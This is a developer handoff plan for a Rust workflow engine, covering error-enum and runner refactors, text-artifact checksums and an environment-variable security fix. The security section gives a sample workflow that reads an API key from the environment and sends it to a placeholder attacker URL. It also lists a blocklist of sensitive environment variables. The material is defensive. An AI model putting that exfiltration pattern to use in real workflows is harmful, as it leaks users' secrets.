# Handoff Plan — v0.59 Remaining Issues

> Post-launch refactors, security hardening, and E2E consistency fixes.
> 5 issues: 2 large refactors (ARCH), 1 security hardening (SEC), 2 workflow fixes (WF).
> Each issue has: root cause with exact file:line, fix plan with code, verification steps.

## What Was Fixed This Session (11 issues, 10 commits)

| Commit | Fix | Severity |
|--------|-----|----------|
| `0f92a2ad3` | fetch 4xx returns error (unless response:full) | HIGH |
| `0f92a2ad3` | workflow graph uses Dag::edges() (includes with: implicit edges) | LOW |
| `700953240` | fmt tests_wiremock.rs | TRIVIAL |
| `891489a16` | $env.MISSING \| default() now fires instead of failing | HIGH |
| `3f770efcd` | fail_fast:false partial results unblock downstream (PartialSuccess) | HIGH |
| `16da0af6a` | 6 CLI inconsistencies (C1, C4, C7, C8, C9 + check --strict providers) | LOW-MED |
| `cef6f6b0c` | {{skills.NAME}} template resolution (4-pass, injection-safe) | MEDIUM |
| `ed0b7e0cf` | Shell blocklist bypass via quoting (NIKA-053 dequoted) | HIGH |
| `af75876e6` | Value-based secret redaction for custom API keys | MEDIUM |
| `7c98bf3a8` | Artifact format preserved (W2) + fetch UTF-8 lossy (W4) | MEDIUM |

---

## Remaining Issues — Priority Order

| # | Issue | Severity | Effort | Type |
|---|-------|----------|--------|------|
| **ARCH-1** | NikaError 103-variant god enum | LOW | 7-10 days | Refactor |
| **ARCH-2** | runner.rs run() 1,868 lines | LOW | 5-7 days | Refactor |
| **SEC-1** | $env.* unrestricted access | MEDIUM | S | Security |
| **WF-1** | extract:article returns JSON, not text | LOW | S | Design |
| **WF-2** | checksum:null for non-binary artifacts | LOW | S | Feature |

---

## ARCH-1: NikaError 103-Variant God Enum

### Current State

**File**: `tools/nika-engine/src/error.rs` — 2,797 lines, 103 variants.

**Domain sub-enums** exist in `tools/nika-engine/src/error_domains.rs` but are barely adopted:

| Domain Enum | Variants | Callsites | Adoption | Status |
|-------------|----------|-----------|----------|--------|
| BindingError | 3 | 31 | 2% | READY |
| ExecutionError | 6 | 28 | 2% | READY |
| ProviderError | 7 | 12 | <1% | 2 UNUSED variants |
| DagError | 3 | 7 | <1% | READY |
| **Total domain** | **19** | **78** | **6%** | — |

**94% of error handling still uses NikaError directly** (1,319 of 1,397 callsites).

**Zero dead code** in NikaError itself — all 103 variants are actively constructed.

### Top 5 Hotspot Variants (candidates for new domain enums)

| Variant | Callsites | NIKA Code | Potential Domain |
|---------|-----------|-----------|------------------|
| ValidationError | 84 | NIKA-004 | WorkflowError |
| BuiltinToolError | 40 | NIKA-210 | ToolError |
| TemplateParse | 36 | NIKA-074 | BindingError |
| ToolError | 32 | NIKA-2xx | ToolError |
| SchemaFailed | 27 | NIKA-061 | OutputError |

### Fix Plan (4 phases, dependency-ordered)

#### Phase 1 — Audit & Cleanup (1 day)

**Goal**: Remove unused domain variants, establish naming convention.

```rust
// error_domains.rs — remove 2 unused ProviderError variants:
// ProviderError::EndpointNotFound (0 callsites)
// ProviderError::EndpointConnectionFailed (0 callsites)
```

**Decision needed**: Keep NIKA-XXX codes or add domain prefixes?
**Recommendation**: Keep NIKA-XXX (user-facing, in all docs). Domain enums are internal.

**Verify**: `cargo test --workspace --lib` + `grep -rn "EndpointNotFound\|EndpointConnectionFailed"` returns 0 production hits.

#### Phase 2 — Migrate Existing Domains (2-3 days)

**Goal**: Convert 78 callsites from `NikaError::*` to domain enum constructors.

**Order**: BindingError (31) → ExecutionError (28) → DagError (7) → ProviderError (12)

**Pattern** (already established in error_domains.rs):

```rust
// BEFORE:
return Err(NikaError::FetchError { reason: "..." });

// AFTER:
return Err(ExecutionError::FetchFailed { reason: "..." }.into());
```

The `From<DomainError> for NikaError` impls already exist for all 4 domains. This is purely mechanical: change constructor, add `.into()`.

**Files touched per domain**:
- BindingError: `template.rs`, `resolve.rs` (~15 files)
- ExecutionError: `fetch.rs`, `exec.rs`, `infer.rs` (~10 files)
- DagError: `flow.rs`, `runner.rs` (~5 files)
- ProviderError: `provider/*.rs` (~8 files)

**Verify**: Each domain as a separate commit. `cargo test --workspace --lib` after each.

#### Phase 3 — Create New Domain Enums (3-4 days)

**Goal**: Extract the top 5 hotspot clusters into new domain enums.

**New enums to create**:

```rust
// error_domains.rs

/// Tool execution errors (nika:* builtins + MCP tools)
pub enum ToolError {
    BuiltinToolError { tool: String, reason: String },    // 40 callsites
    ToolError { tool: String, reason: String },            // 32 callsites
    McpToolError { server: String, tool: String, ... },    // 11 callsites
    // Total: ~83 callsites
}

/// Structured output validation errors
pub enum OutputError {
    SchemaFailed { task_id: String, errors: Vec<String> }, // 27 callsites
    JsonParse { task_id: String, reason: String },          // 8 callsites
    SchemaFileInvalid { ... },                              // 5 callsites
    // Total: ~40 callsites
}

/// Agent loop errors
pub enum AgentError {
    AgentGuardrail { task_id: String, ... },               // 5 callsites
    AgentMaxTurns { ... },                                  // 3 callsites
    // Total: ~8 callsites
}

/// MCP connection errors
pub enum McpError {
    McpNotConnected { name: String },                       // 11 callsites
    McpServerStartFailed { ... },                           // 5 callsites
    McpParamValidation { ... },                             // 4 callsites
    // Total: ~20 callsites
}
```

**Verify**: Each new domain as a separate PR. Full test suite after each.

#### Phase 4 — Migration of Remaining Variants (2-3 days)

**Goal**: Move remaining scattered variants into appropriate domains.

**Mapping** (partial — full audit needed):

| Current Variant | Target Domain | Callsites |
|----------------|---------------|-----------|
| ValidationError | WorkflowError | 84 |
| TemplateParse | BindingError (extend) | 36 |
| PathNotFound | BindingError (extend) | 22 |
| NullValue | BindingError (extend) | 8 |
| ArtifactWriteFailed | ArtifactError (new) | 12 |
| CourseError | CourseError (new) | 15 |
| MediaError | MediaError (new) | 18 |

**End state**: NikaError reduced from 103 to ~30-40 variants (routing + uncategorized).
Domain enums handle ~70% of callsites.

### Verification Checklist

- [ ] `cargo test --workspace --lib` passes after each phase
- [ ] `cargo clippy --workspace -- -D warnings` clean
- [ ] All NIKA-XXX codes preserved (grep existing docs)
- [ ] `FixSuggestion` trait still works for all migrated variants
- [ ] Error display strings unchanged (backward compat for CLI output parsing)
- [ ] No new `.unwrap()` introduced

---

## ARCH-2: runner.rs run() 1,868 Lines

### Current State

**File**: `tools/nika-engine/src/runtime/runner.rs` — 7,943 lines total.

**run() function**: Lines 1446-3313 — **1,868 lines** (not 1,580 as originally estimated).

### Section Map

```
run() — 1,868 lines
├── A: Initialization (1446-1689, 244 lines)
│   ├── Cancellation check, orchestrator, lockfile
│   ├── Context + inputs loading
│   ├── Agent resolution, executor wiring
│   └── DAG computation + rendering
├── B: Main Execution Loop (1690-3039, 1,350 lines)
│   ├── B1: Loop control + safety (1690-1841, 152 lines)
│   │   ├── Cancellation, pause/resume, get_ready_tasks
│   │   └── Deadlock detection, max_duration timeout
│   ├── B2: For_each items resolution (1871-2571, 701 lines) ← DUPLICATION
│   │   ├── Format 1: inline array ["a","b","c"] (1937-2055, 119 lines)
│   │   ├── Format 2: $alias.path (2238-2391, 154 lines) ← DUPLICATE A
│   │   ├── Format 3: $alias (simple ref) (2056-2237, 182 lines)
│   │   ├── Format 4: {{template}} (2392-2443, 52 lines)
│   │   └── Format 5: {{with.alias.path}} (2444-2558, 115 lines) ← DUPLICATE B
│   ├── B3: Task dispatch (2572-2878, 307 lines)
│   │   ├── Semaphore + cancellation token setup
│   │   ├── Spawn loop (per-item iteration)
│   │   └── Empty for_each handling
│   └── B4: Result collection (2880-3039, 160 lines)
│       ├── tokio::select! (join_next, cancellation, timeout)
│       ├── For_each result accumulation
│       └── Error propagation + fail_fast
├── B5: For_each aggregation (3041-3129, 89 lines)
│   ├── Sort by index, collect outputs
│   ├── PartialSuccess vs Failed (fail_fast gating)
│   └── Event emission (ForEachCompleted)
└── C: Completion & Summary (3130-3313, 184 lines)
    ├── Media verification + artifact writing
    ├── Final output extraction
    ├── Event emission (WorkflowCompleted/Failed)
    └── Summary rendering + MCP shutdown
```

### Critical Duplication: Format 2 vs Format 5

**Format 2** (`$alias.path`, lines 2238-2391, 154 lines):
```rust
// Parse path: split on '.', resolve base via bindings/datastore
// Auto-parse JSON strings, traverse segments, handle arrays
```

**Format 5** (`{{with.alias.path}}`, lines 2444-2558, 115 lines):
```rust
// IDENTICAL LOGIC: parse, resolve, auto-parse, traverse
// Only difference: input source (binding path vs template expression)
```

**~75% code duplication** (shared: path parsing, base resolution, JSON auto-parse, segment traversal, error handling). Format 2 has one extra edge case (empty alias check).

### Other Large Functions

| Function | Lines | Count | Extractable? |
|----------|-------|-------|-------------|
| `execute_task_iteration` | 982-1428 | 447 | Partially (verb dispatch + structured output) |
| `execute_with_retry` | 709-888 | 180 | Yes (retry loop is self-contained) |

### Local Types

| Type | Lines | Notes |
|------|-------|-------|
| `LockfileGuard` | 59-140 | RAII guard, fully extractable to utility module |
| `IterationResult` | 191-200 | Return type for for_each, tightly coupled |

### Fix Plan (6 phases, dependency-ordered)

#### Phase 1 — Extract For_Each Path Resolution (2 days)

**Goal**: Eliminate 260 lines of duplication, create reusable `resolve_for_each_path()`.

```rust
// New file: runtime/for_each.rs (or inline helper)

/// Resolve a for_each item path to a JSON array.
///
/// Handles both $alias.path and {{with.alias.path}} formats.
/// Returns the resolved array or an error with context.
pub(crate) fn resolve_for_each_path(
    path: &str,
    alias: Option<&str>,
    segments: &[&str],
    bindings: &ResolvedBindings,
    datastore: &RunContext,
) -> Result<Vec<Value>, NikaError> {
    // 1. Resolve base value (bindings → datastore fallback)
    // 2. Auto-parse JSON strings
    // 3. Traverse dot-separated segments
    // 4. Validate result is an array
    // 5. Return items
}
```

**Files**: `runner.rs` (delete ~260 lines), new `for_each.rs` (~80 lines).

**Verify**: `cargo test -p nika-engine --lib -- for_each` (existing tests cover all formats).

#### Phase 2 — Extract Completion Logic (1 day)

**Goal**: Extract deadlock detection + completion check from B1.

```rust
/// Check if workflow is complete, deadlocked, or should continue.
pub(crate) fn check_completion_status(
    datastore: &RunContext,
    workflow: &AnalyzedWorkflow,
    pending_count: usize,
    active_count: usize,
) -> CompletionStatus {
    enum CompletionStatus {
        Complete,
        Deadlocked { blocked_tasks: Vec<String> },
        Continue,
    }
}
```

**Lines eliminated**: ~90 lines from B1 (1752-1841).

#### Phase 3 — Extract DAG Setup + Rendering (0.5 day)

**Goal**: Move DAG computation and ASCII rendering out of run().

```rust
fn setup_and_render_dag(
    workflow: &AnalyzedWorkflow,
    renderer: &mut dyn Renderer,
) -> Result<Dag, NikaError> {
    // Lines 1618-1684 of current run()
}
```

**Lines eliminated**: ~66 lines from section A.

#### Phase 4 — Extract Result Collection (2 days)

**Goal**: Move the tokio::select! loop (B4) into a helper. This is the hardest extraction because of JoinSet ownership and cancel token interaction.

```rust
/// Collect one batch of task results from the JoinSet.
///
/// Returns when either:
/// - A task completes (Ok/Err)
/// - Cancellation is signaled
/// - Max duration timeout fires
async fn collect_next_result(
    join_set: &mut JoinSet<IterationResult>,
    cancel_token: &CancellationToken,
    deadline: Instant,
) -> CollectionResult { ... }
```

**Lines eliminated**: ~160 lines from B4 (2880-3039).

#### Phase 5 — Extract For_Each Aggregation (0.5 day)

**Goal**: Move B5 aggregation logic into a pure function.

```rust
/// Aggregate for_each iteration results into a parent TaskResult.
pub(crate) fn aggregate_for_each_results(
    results: &mut Vec<(usize, TaskResult)>,
    is_fail_fast: bool,
) -> (TaskResult, ForEachStats) { ... }
```

**Lines eliminated**: ~89 lines from B5 (3041-3129). Already well-isolated.

#### Phase 6 — Extract Finalization (1 day)

**Goal**: Move section C (completion, summary, cleanup) into a method.

```rust
async fn finalize_workflow(&mut self, result: &RunResult) -> Result<(), NikaError> {
    // Media verification, artifact writing, final output
    // Event emission, summary rendering, MCP shutdown
    // Lines 3130-3313
}
```

**Lines eliminated**: ~184 lines from section C.

### Expected End State

| Metric | Before | After |
|--------|--------|-------|
| run() lines | 1,868 | ~600-700 |
| Extracted helpers | 0 | 6 functions |
| Duplication | 260 lines | 0 |
| Testable units | 1 (run()) | 7 (run() + 6 helpers) |

### Verification Checklist

- [ ] `cargo test --workspace --lib` after each phase
- [ ] `cargo test -p nika-engine --lib -- for_each` specifically for Phase 1
- [ ] All extracted functions are `pub(crate)` (not public API)
- [ ] No behavior changes — purely structural
- [ ] Benchmark: `cargo bench` on task_execution shows no regression

---

## SEC-1: $env.* Unrestricted Access

### Root Cause

**File**: `tools/nika-engine/src/binding/resolve.rs:835-851`

```rust
BindingSource::Env(var_name) => {
    const SECRET_PATTERNS: &[&str] =
        &["KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "AUTH"];
    let name_upper = var_name.to_uppercase();
    if SECRET_PATTERNS.iter().any(|p| name_upper.contains(p)) {
        tracing::debug!(var = %var_name, "Accessing secret-pattern env var via $env binding");
    }
    match std::env::var(var_name.as_ref()) {
        Ok(val) => Ok(Some(Value::String(val))),
        Err(_) => Ok(None),
    }
}
```

**Problem**: `$env.*` reads ANY environment variable with zero restrictions. A malicious workflow can exfiltrate secrets:

```yaml
with: { key: $env.ANTHROPIC_API_KEY }
fetch: { url: "https://attacker.com/steal?key={{with.key}}" }
```

**Mitigating factor**: Workflow author = user. Only a risk for:
1. Untrusted YAML (package registry, shared workflows)
2. Template injection where LLM output contains `$env.*` references

### Current Protections

- SECRET_PATTERNS audit logging (debug level only) — **does not block**
- SSRF protection blocks `fetch:` to private IPs — **but public exfil URLs work**
- Value-based redaction (S3 fix) prevents trace leakage — **but runtime exfil still works**

### Fix Plan

**Option A: Blocklist for known-dangerous vars (RECOMMENDED)**

```rust
// resolve.rs — add before std::env::var()

/// Environment variables that MUST NOT be exposed via $env bindings.
/// These contain credentials, keys, or system paths that could be
/// exploited for privilege escalation or secret exfiltration.
const BLOCKED_ENV_VARS: &[&str] = &[
    // Process/system internals
    "SSH_AUTH_SOCK",
    "GPG_AGENT_INFO",
    "SUDO_ASKPASS",
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
    // Nika internals (vault passphrase, daemon socket)
    "NIKA_VAULT_PASSPHRASE",
    "NIKA_DAEMON_SOCKET",
];

// In the Env resolution arm:
let name_upper = var_name.to_uppercase();
if BLOCKED_ENV_VARS.iter().any(|&blocked| name_upper == blocked.to_uppercase()) {
    tracing::warn!(var = %var_name, "Blocked access to restricted env var via $env binding");
    return Ok(None); // Behaves as if unset
}
```

**Option B: Allowlist (stricter, more work)**

Only allow env vars matching `*_API_KEY`, `*_TOKEN`, `NIKA_*`, or explicitly declared in `nika.toml`:

```toml
[policy]
allow_env = ["ELEVENLABS_API_KEY", "CUSTOM_TOKEN"]
```

**Recommendation**: Option A (blocklist) for v0.59. Option B for v0.60 with package registry.

### Log All $env Accesses at INFO Level

Currently debug-only. Upgrade to INFO for security audit trail:

```rust
// Change from tracing::debug to tracing::info
if SECRET_PATTERNS.iter().any(|p| name_upper.contains(p)) {
    tracing::info!(var = %var_name, "Accessing env var via $env binding (secret pattern)");
} else {
    tracing::info!(var = %var_name, "Accessing env var via $env binding");
}
```

### Verification

```bash
# Test blocklist
echo 'schema: "nika/workflow@0.12"
workflow: test
tasks:
  - id: leak
    with: { sock: $env.SSH_AUTH_SOCK }
    infer: "Echo: {{with.sock}}"' > /tmp/test-env.nika.yaml

nika run /tmp/test-env.nika.yaml --dry-run
# Expected: sock resolves to null/empty, not the actual socket path
```

---

## WF-1: extract:article Returns JSON Object, Not Plain Text

### Root Cause

**File**: `tools/nika-engine/src/runtime/executor/extract.rs:54-70`

```rust
ExtractMode::Article => {
    let article = readability.parse()?;
    Ok(serde_json::json!({
        "title": article.title,
        "content": article.content.to_string(),
        "text_content": article.text_content.to_string(),
        "excerpt": article.excerpt,
        "byline": article.byline,
    }).to_string())
}
```

**Behavior**: Returns a JSON string with 5 fields: `title`, `content`, `text_content`, `excerpt`, `byline`.

**Why `| trim` fails**: The transform pipeline parses the JSON string back into `Value::Object`, then `TransformOp::Trim` rejects non-string values (`transform.rs:254-257`).

### This Is By Design

`extract:article` intentionally returns structured data (all Readability fields). Users who want plain text should use `text_content`:

```yaml
# CORRECT PATTERN:
- id: scrape
  fetch:
    url: "https://example.com/article"
    extract: article

- id: use_text
  with:
    text: $scrape.text_content    # ← extract the field you want
  infer: "Summarize: {{with.text | trim}}"
```

### Options (pick one)

**Option A: Document the pattern (RECOMMENDED)**
Add to `nika help verbs` and CLAUDE.md:
> `extract: article` returns a JSON object with `title`, `content`, `text_content`, `excerpt`, `byline`. Use `$task.text_content` to get plain text.

**Option B: Add `extract: article_text` mode**
New extract mode that returns only `text_content` as a plain string:
```yaml
fetch:
  url: "https://example.com"
  extract: article_text   # Returns plain text, not JSON
```

Implementation: ~10 lines in `extract.rs`, add to `ExtractMode` enum.

**Option C: Add `| field("key")` transform**
New parametric transform to extract a field from a JSON object:
```yaml
with:
  text: "$scrape | field(\"text_content\") | trim"
```

Implementation: ~20 lines in `transform.rs`.

**Recommendation**: Option A (document) for v0.59. Consider Option B for v0.60.

---

## WF-2: checksum:null for Non-Binary Artifacts

### Root Cause

**File**: `tools/nika-engine/src/runtime/artifact_processor.rs:145-149`

```rust
let checksum = if write_result.format == OutputFormat::Binary {
    resolve_binary_checksum(output_spec, media_refs)  // BLAKE3 hash from CAS
} else {
    None  // ← ALL text/json/markdown artifacts get null
};
```

**Binary path**: Uses BLAKE3 hashes from the CAS (content-addressable storage) via `MediaRef.hash`.

**Text path**: Intentionally skipped — the content bytes are available but no hash is computed.

### Fix

**File**: `tools/nika-engine/src/runtime/artifact_processor.rs`

The `content` variable (the formatted text) is available at line 350 before the write call. Add BLAKE3 hashing:

```rust
// Replace lines 145-149 with:
let checksum = match write_result.format {
    OutputFormat::Binary => resolve_binary_checksum(output_spec, media_refs),
    _ => {
        // Compute BLAKE3 hash of text content for integrity verification
        let hash = blake3::hash(content.as_bytes());
        Some(format!("blake3:{}", hash.to_hex()))
    }
};
```

**Problem**: The `content` variable is inside `write_single_artifact()` (line 350), but the checksum is computed in the calling function (line 145) which only has `write_result`. Need to either:

1. **Return content hash from `write_single_artifact()`** — add `checksum: Option<String>` to `WriteResult`
2. **Compute hash inside `write_single_artifact()`** and attach to WriteResult before returning

**Option 1 (cleaner)**:

```rust
// io/writer.rs — WriteResult struct
pub struct WriteResult {
    pub path: PathBuf,
    pub size: u64,
    pub format: OutputFormat,
    pub checksum: Option<String>,  // ← NEW: BLAKE3 hash of written content
}

// artifact_processor.rs — write_single_artifact(), before returning:
let checksum = if format == ArtifactFormat::Binary {
    None // Binary checksum from media_refs, resolved by caller
} else {
    Some(format!("blake3:{}", blake3::hash(content.as_bytes()).to_hex()))
};

// In WriteResult construction:
Ok(WriteResult {
    path: written_path,
    size: written_size,
    format: output_format,
    checksum,
})

// In the calling code (line 145), merge:
let checksum = write_result.checksum.or_else(|| {
    if write_result.format == OutputFormat::Binary {
        resolve_binary_checksum(output_spec, media_refs)
    } else {
        None
    }
});
```

### Dependency Check

```bash
grep -r "blake3" tools/Cargo.toml tools/nika-engine/Cargo.toml
```

If `blake3` is not already a dependency of nika-engine, add it:
```toml
blake3 = "1"
```

It's likely already present (used by CAS in nika-media). If only in nika-media, either:
- Add to nika-engine's Cargo.toml
- Or use `sha2` (already likely a dependency via other crates)

### Verification

```bash
# Run a workflow with text artifacts
echo 'schema: "nika/workflow@0.12"
workflow: checksum-test
artifacts:
  dir: ./test-output
  format: markdown
  manifest: true
tasks:
  - id: gen
    infer: "Write a haiku about Rust"
    artifact: { path: haiku.md }' > /tmp/checksum-test.nika.yaml

nika run /tmp/checksum-test.nika.yaml
cat test-output/artifacts.json | jq '.[] | .checksum'
# Expected: "blake3:abc123..." instead of null
```

---

## Execution Timeline

```
Sprint 5 (quick fixes, 1 day):
  SEC-1 ($env blocklist) — 1 commit, 1h
  WF-1 (document extract:article) — 1 commit, 30min
  WF-2 (text artifact checksum) — 1 commit, 2h

Sprint 6-8 (ARCH-2 runner.rs, 5-7 days):
  Phase 1: resolve_for_each_path() — 2 days
  Phase 2: check_completion_status() — 1 day
  Phase 3: setup_and_render_dag() — 0.5 day
  Phase 4: collect_next_result() — 2 days
  Phase 5: aggregate_for_each_results() — 0.5 day
  Phase 6: finalize_workflow() — 1 day

Sprint 9-12 (ARCH-1 NikaError, 7-10 days):
  Phase 1: Audit + cleanup unused variants — 1 day
  Phase 2: Migrate existing domain callsites — 2-3 days
  Phase 3: Create new domain enums (ToolError, OutputError, McpError, AgentError) — 3-4 days
  Phase 4: Migrate remaining variants — 2-3 days
```

## Socratic Questions

1. **SEC-1**: Blocklist (block known-dangerous) or allowlist (allow only declared)? Blocklist is simpler but allowlist is safer for package registry.
2. **WF-1**: Document-only, or add `extract: article_text` mode?
3. **WF-2**: BLAKE3 (consistent with CAS) or SHA256 (standard, wider tooling)?
4. **ARCH-2**: Extract Phase 4 (tokio::select! loop) as method or free function? Method keeps `&mut self` access to JoinSet.
5. **ARCH-1**: Create `WorkflowError` for the 84-callsite `ValidationError`? Or keep it in NikaError since it's the catch-all?
6. **ARCH-1**: Should `FixSuggestion` trait move to domain enums? Currently only on NikaError.
7. **ARCH-2**: Should `LockfileGuard` move to `util/` or stay in `runner.rs`?
